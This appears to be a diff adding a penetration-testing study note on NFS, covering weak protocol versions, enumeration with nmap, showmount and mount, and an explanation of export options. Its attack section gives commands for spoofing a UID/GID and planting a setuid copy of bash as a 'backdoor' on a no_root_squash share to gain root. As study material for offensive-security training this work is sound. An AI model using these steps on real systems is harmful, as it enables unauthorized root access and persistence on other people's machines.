@@ -1,0 +1,53 @@
+---
+tags:
+  - protocol
+  - footprint
+  - exploitation
+  - initial_access
+cssclasses:
+  - "[[SMB]]"
+---
+
+### Attack vectors
+
+| Version | Features (Security)                                                                            |
+| ------- | ---------------------------------------------------------------------------------------------- |
+| NFSv2   | Absolutely Dumb                                                                                |
+| NFSv3   | Dumb (better error reporting)                                                                  |
+| NSFv4   | Kerberos authentication mechanism, works through firewalls and on the internet. Supports ACLs. |
+NSFv4 - `bruteforce` and preying
+NSFv2/3 (misconfigured):
+	1. **User UID/GID spoof:** enumerate permissions and users - creates fake ones (it also could be the admin user if `no_root_squash` is enabled)
+	2. `no_root_squash` - RCE
+
+```bash
+sudo groupadd -g 1001 target_group
+sudo useradd -u 1001 -g 1001 target_user
+```
+
+```bash
+sudo cp /bin/bash /mnt/loot/backdoor
+ sudo chmod +xs /mnt/loot/backdoor
+```
+Just trigger backdoor (like from webshell)
+
+---
+### Enumeration (basic stuff)
+```bash
+sudo nmap <ip> -p111,2049 -sV -sC (or --script "nfs*") 
+```
+### Footprinting ([[NFS - Footprint|NFS]])
+```bash
+showmount -e 10.129.14.128                   # show shares on the target IP
+sudo mount -t nfs <ip.address> /mnt/ -o nolock   # mounting shared dirs
+```
+
+mount `-t`  choose file-system type (in this case NFS)
+`-o nolock`  choose option - `nolock` disables Network Lock Manager (bypasses file locking mechanism)
+
+| Options          | Descriptions                                        |
+| ---------------- | --------------------------------------------------- |
+| `rw`             | read and write perms                                |
+| `insecure`       | ports above 1024                                    |
+| `nohide`         | don't hide mounted below share other directories/fs |
+| `no_root_squash` | root permissions on files (created by root)         |
